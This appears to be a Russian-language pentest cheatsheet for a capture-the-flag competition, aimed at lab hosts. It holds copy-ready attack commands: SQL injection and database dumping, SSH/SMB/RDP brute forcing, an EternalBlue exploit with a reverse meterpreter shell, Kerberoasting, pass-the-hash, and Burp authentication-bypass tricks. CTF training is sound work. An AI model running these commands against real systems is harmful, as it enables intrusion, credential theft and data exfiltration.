# 🛠️ Cheatsheet: Утилиты пентеста (Kali Linux)

> Все команды готовы к копированию. Сохраните в `~/flags/cheatsheet_tools.md`

---

## 🔍 Nmap — сканирование

### Быстрое обнаружение хостов
```bash
sudo nmap -sn 10.255.44.0/24 -oG hosts.txt
grep "Up" hosts.txt | awk '{print $2}' > targets.txt
```

### Полное сканирование портов (быстро)
```bash
sudo nmap -p- -T4 --min-rate 3000 10.255.44.100 -oA scans/full
```

### Детальное сканирование открытых портов
```bash
sudo nmap -sV -sC -p $(grep open scans/full.gnmap | cut -d' ' -f4 | tr ',' ' ' | sed 's/\/tcp//g') 10.255.44.100 -oA scans/detailed
```

### Специализированные сканирования
```bash
# SMB уязвимости
sudo nmap -p445 --script smb-vuln-* 10.255.44.100 -oA scans/smb

# Веб-уязвимости
sudo nmap -p80,443 --script http-vuln-* 10.255.44.100 -oA scans/web

# Анонимный доступ
sudo nmap -p21,22,80,443,445,389,3306 --script "*anon*" 10.255.44.100 -oA scans/anonymous
```

---

## 🌐 Веб-разведка

### ffuf — directory busting (рекомендуется)
```bash
# Быстрый режим
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.255.44.100/FUZZ -t 100 -c -mc 200,204,301,302,307,403

# С расширениями
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.txt,.html,.bak -u http://10.255.44.100/FUZZ -t 80 -c

# Поиск параметров
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.255.44.100/index.php?FUZZ=test -t 50 -c
```

### gobuster — альтернатива
```bash
gobuster dir -u http://10.255.44.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html -t 50
```

### Обязательные проверки (делать ВСЕГДА!)
```bash
curl http://10.255.44.100/robots.txt
curl -s http://10.255.44.100/.git/HEAD && echo "⚠️ .git доступен!"
curl -s http://10.255.44.100/.env | grep -i "pass\|key\|secret"
```

---

## 💉 SQLmap — SQL Injection

### Обнаружение
```bash
sqlmap -u "http://10.255.44.100/login.php?user=admin" --batch --level=5 --risk=3
```

### Извлечение данных
```bash
sqlmap -u "http://10.255.44.100/login.php?user=admin" --dump-all --batch --output-dir=~/flags/sqlmap
sqlmap -u "http://10.255.44.100/login.php?user=admin" -D db -T users --dump --batch
```

### Обход фильтров
```bash
sqlmap -u "http://10.255.44.100/login.php?user=admin" --tamper=space2comment,between --batch
```

---

## 🔑 Hydra — брутфорс

### Подготовка словарей
```bash
cat > ~/flags/users.txt << EOF
admin
administrator
root
user
guest
svc
EOF

cat > ~/flags/passwords.txt << EOF
password
admin
P@ssw0rd
P@ssw0rd2026
reaskills
cyber
EOF
```

### Брутфорс сервисов
```bash
# SSH
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt ssh://10.255.44.100 -t 4 -vV

# FTP
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt ftp://10.255.44.100 -vV

# HTTP POST форма
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt 10.255.44.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -vV

# RDP (Windows)
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt rdp://10.255.44.100 -vV

# SMB
hydra -L ~/flags/users.txt -P ~/flags/passwords.txt smb://10.255.44.100 -vV
```

---

## 📁 SMB — crackmapexec / smbclient

### Анонимный доступ
```bash
smbclient -L //10.255.44.100 -N
crackmapexec smb 10.255.44.100 -u '' -p '' --shares
```

### Перечисление с учётными данными
```bash
crackmapexec smb 10.255.44.100 -u admin -p 'P@ssw0rd2026' --shares --users --sessions
```

### Доступ к шарам
```bash
smbclient //10.255.44.100/share -U admin%P@ssw0rd2026
# Внутри:
ls
get flag.txt
recurse ON
prompt OFF
mget *
```

---

## 🪪 LDAP / FreeIPA

### Анонимный поиск
```bash
ldapsearch -x -h 10.255.44.100 -b "dc=reaskills,dc=cyber" "(objectClass=*)" | tee ldap_anon.txt
ldapsearch -x -h 10.255.44.100 -b "dc=reaskills,dc=cyber" "(uid=*)" cn sn mail
```

### Поиск флагов в атрибутах
```bash
ldapsearch -x -h 10.255.44.100 -b "dc=reaskills,dc=cyber" "(|(description=*RS{*)(comment=*RS{*))" | grep -A3 -B3 "RS{"
```

---

## 💀 Metasploit

### Быстрый старт
```bash
msfconsole -q
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.255.44.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.255.44.1
exploit
```

### Meterpreter — пост-эксплуатация
```bash
sysinfo
getuid
ps
shell
download /path/to/flag.txt
upload /local/script.sh /tmp/
getsystem
run post/multi/recon/local_exploit_suggester
```

---

## 👑 Impacket — AD атаки

### Kerberoasting
```bash
GetUserSPNs.py -dc-ip 10.255.44.100 reaskills.cyber/admin:'P@ssw0rd2026' -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### ASREPRoasting
```bash
GetNPUsers.py reaskills.cyber/ -usersfile users.txt -dc-ip 10.255.44.100 -outputfile asreproast.txt
hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash
```bash
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@10.255.44.100 "whoami"
```

---

## 🌐 Другие полезные утилиты

### Nikto — веб-сканер
```bash
nikto -h http://10.255.44.100 -output nikto.txt
```

### WhatWeb — анализ технологий
```bash
whatweb http://10.255.44.100 -v
```

### WAFW00F — обнаружение WAF
```bash
wafw00f http://10.255.44.100
```

### Evil-WinRM — PowerShell шелл для Windows
```bash
evil-winrm -i 10.255.44.100 -u admin -p 'P@ssw0rd2026'
```

---

## 🕸️ Burp Suite — веб-пентест (обязательно к использованию!)

> **Важно:** В Kali предустановлена **Community Edition** (бесплатная). Для соревнований её достаточно — основные функции (Proxy, Repeater, Intruder) работают без ограничений.

### Быстрый старт (первые 60 секунд)

```bash
# Запуск Burp Suite
burpsuite &

# Настройка браузера (Firefox в Kali):
# 1. Открыть: Настройки → Сеть → Параметры → Ручная настройка прокси
# 2. HTTP-прокси: 127.0.0.1, порт: 8080
# 3. Установить галочку "Использовать этот прокси-сервер для всех протоколов"
```

### 🔁 Перехват запросов (Proxy → Intercept)

| Действие | Как сделать | Зачем нужно в REA2026 |
|----------|-------------|----------------------|
| **Включить перехват** | Proxy → Intercept → ON | Перехватить запрос на логин/поиск флага |
| **Передать запрос** | Forward (или отключить Intercept) | Пропустить запрос без изменений |
| **Изменить параметр** | Кликнуть на значение → ввести `' OR 1=1--` | Тестирование SQLi вручную |
| **Повторить запрос** | ПКМ → Send to Repeater | Перенести в Repeater для глубокого анализа |

> 💡 **Совет:** Всегда включайте **Proxy → Intercept → OFF** после настройки — иначе браузер будет «зависать» на каждом запросе.

---

### 🔄 Repeater — ручное тестирование уязвимостей

**Сценарий 1: Тестирование SQL Injection**
1. Перехватите запрос с параметром (например, `?id=1`)
2. ПКМ → **Send to Repeater**
3. В Repeater измените параметр:
   ```
   id=1'          → смотрим ошибку БД
   id=1'-- -      → комментируем остаток запроса
   id=1 UNION SELECT null,version(),null-- -
   ```
4. Анализируйте ответ: ошибки БД = уязвимость подтверждена

**Сценарий 2: Поиск флагов в скрытых параметрах**
1. Перехватите любой запрос
2. ПКМ → **Send to Repeater**
3. Добавьте параметры вручную:
   ```
   GET /api/data?id=1&debug=true HTTP/1.1
   GET /api/data?id=1&showflag=1 HTTP/1.1
   GET /api/data?id=1&secret=admin HTTP/1.1
   ```
4. Часто флаги открываются при добавлении `debug=1`, `showflag=true`, `admin=1`

**Сценарий 3: Обход аутентификации**
1. Перехватите запрос после логина
2. В заголовках найдите `Authorization: Bearer <токен>`
3. Измените токен на `admin` или удалите заголовок → проверьте ответ

---

### 💣 Intruder — автоматизированные атаки

#### Атака 1: Брутфорс логин-формы
1. Перехватите POST-запрос логина:
   ```
   POST /login HTTP/1.1
   ...
   username=admin&password=test
   ```
2. Выделите `admin` → ПКМ → **Send to Intruder**
3. Во вкладке **Positions**:
   - Установите § вокруг `admin`: `username=§admin§&password=test`
   - Payload type: **Simple list**
   - Payloads → Load → `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
4. Во вкладке **Options** → Grep - Extract:
   - Добавьте правило для извлечения флага: `RS{.*?}`
5. Start attack → смотрите столбец **Extracted** на флаги

#### Атака 2: Фаззинг путей (альтернатива ffuf)
1. Перехватите запрос: `GET /index.php HTTP/1.1`
2. Выделите `index.php` → ПКМ → **Send to Intruder**
3. Positions: `GET /§index.php§ HTTP/1.1`
4. Payloads → Load → `/usr/share/seclists/Discovery/Web-Content/common.txt`
5. Start attack → фильтруйте по статусу 200/302

#### Атака 3: Поиск флагов в параметрах
1. Создайте запрос: `GET /api/flag?id=§1§ HTTP/1.1`
2. Payloads: числа от 1 до 1000 (Numbers payload)
3. Grep - Extract: добавьте правило `RS{.*?}`
4. Start attack → флаги появятся в колонке **Extracted**

> ⚠️ **Важно для REA2026:** В Community Edition Intruder ограничен **1 запросом в секунду**. Для скорости:
> - Используйте узкие словари (ТОП-100 путей вместо 10к)
> - Запускайте несколько экземпляров Burp для параллельных атак

---

### 🔍 Scanner (только в Pro версии)

Если у вас есть лицензия:
1. ПКМ на целевом хосте в **Target → Site map**
2. **Scan → Active scan**
3. После завершения: **Dashboard → Issues** → ищите:
   - `SQL injection`
   - `Cross-site scripting`
   - `Path traversal`
   - `Authentication bypass`

> 💡 **Альтернатива в Community:** Используйте **nuclei** из терминала:
> ```bash
> nuclei -u http://10.255.44.100 -t /usr/share/nuclei-templates/ -severity high,critical
> ```

---

### 🔠 Decoder / Comparer — работа с данными

| Задача | Как сделать | Пример для флагов |
|--------|-------------|-------------------|
| **Декодировать Base64** | Decoder → Paste → Decode as Base64 | Флаг в заголовке `Authorization: Bearer <base64>` |
| **Закодировать в URL** | Decoder → Paste → Encode as URL | Обход фильтров: `space` → `%20` |
| **Сравнить два ответа** | Comparer → Paste → Compare | Сравнить ответы с `id=1` и `id=1'` для обнаружения ошибок БД |
| **Хешировать пароль** | Decoder → Hash → MD5/SHA1 | Подготовка хешей для атаки на API |

**Практический пример:**
```text
# В ответе сервера нашли:
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."} 

# Действия:
1. Скопировать токен после "token":" 
2. Вставить в Decoder → Smart decode
3. Результат: {"user":"guest","flag":"RS{jwt_decode_is_easy}"}
```

---

### 🚩 ТОП-5 тактик для поиска флагов через Burp

| Тактика | Как применить | Где часто работает |
|---------|---------------|---------------------|
| **Добавить `?debug=1`** | Изменить URL в Repeater → добавить `?debug=1` | API-эндпоинты, админ-панели |
| **Изменить `user_id`** | В запросе: `"user_id":1` → `"user_id":0` или `999` | Профили пользователей, приватные данные |
| **Добавить заголовок `X-Forwarded-For: 127.0.0.1`** | Вкладка Headers → Add → `X-Forwarded-For: 127.0.0.1` | Защита по IP (админка доступна только с localhost) |
| **Изменить `role=user` → `role=admin`** | В JSON/XML теле запроса заменить значение | RBAC-системы без серверной проверки |
| **Повторить запрос с `GET` → `POST`** | Method: GET → POST + переместить параметры в тело | Обход ограничений методов |

---

### ⚡ Готовый рабочий процесс для веб-цели

```text
1. Настроить прокси в браузере → открыть целевой сайт
2. Прокликать все функции сайта (логин, поиск, профиль) → 
   всё сохранится в Target → Site map
3. Найти интересные эндпоинты:
   - /api/ → часто содержит флаги
   - /admin/ → проверить обход аутентификации
   - /debug/ → часто открыта без пароля
4. Для каждого эндпоинта:
   а) Send to Repeater → тестировать параметры на инъекции
   б) Send to Intruder → брутфорс ID/параметров
   в) Добавить ?debug=1, ?showflag=1, ?admin=1
5. При обнаружении уязвимости → сразу искать флаг в ответе
```

---

### ❌ Распространённые ошибки новичков

| Ошибка | Последствие | Как избежать |
|--------|-------------|--------------|
| Не отключили Intercept после настройки | Браузер «зависает» на каждом запросе | После настройки прокси → **Intercept OFF** |
| Используют только Scanner (Pro) | Пропускают логические уязвимости | Всегда проверяйте вручную через Repeater |
| Не анализируют ответы после атаки | Пропускают флаги в теле ответа | Всегда смотрите полный ответ в Repeater/Intruder |
| Брутфорсят 10к путей в Intruder Community | Атака займёт 3 часа | Используйте узкие словари (ТОП-200) или ffuf из терминала |
| Не проверяют заголовки ответа | Пропускают флаги в `X-Flag`, `Server` | Всегда смотрите вкладку **Headers** в Repeater |

---

### 💡 Профессиональные советы для REA2026

1. **Сочетайте Burp + терминал:** 
   - `ffuf` для быстрого фаззинга → 
   - найденные пути анализируйте в **Repeater** для поиска флагов

2. **Ищите флаги в неочевидных местах через Burp:**
   ```http
   # Заголовки ответа
   HTTP/1.1 200 OK
   X-Flag: RS{burp_headers_are_visible}
   Server: FlagServer/1.0

   # Cookies
   Set-Cookie: session=abc123; flag=RS{cookie_flags}

   # JavaScript в теле ответа
   <script>var flag = "RS{hidden_in_js}";</script>
   ```

3. **Автоматизируйте поиск флагов в Intruder:**
   - Options → Grep - Extract → Add → Regex: `RS\{.*?\}`
   - Все найденные флаги появятся в отдельной колонке

4. **Используйте «сравнение ответов» для обнаружения уязвимостей:**
   - Comparer → два запроса: `id=1` vs `id=1'`
   - Разница в ответах = признак уязвимости

> 🌟 **Финальный совет:** Burp Suite — не «волшебная кнопка». Его сила в **ручном анализе** через Repeater. 80% флагов находятся не автоматическим сканером, а изменением одного параметра вручную (`debug=1`, `id=0`, `role=admin`).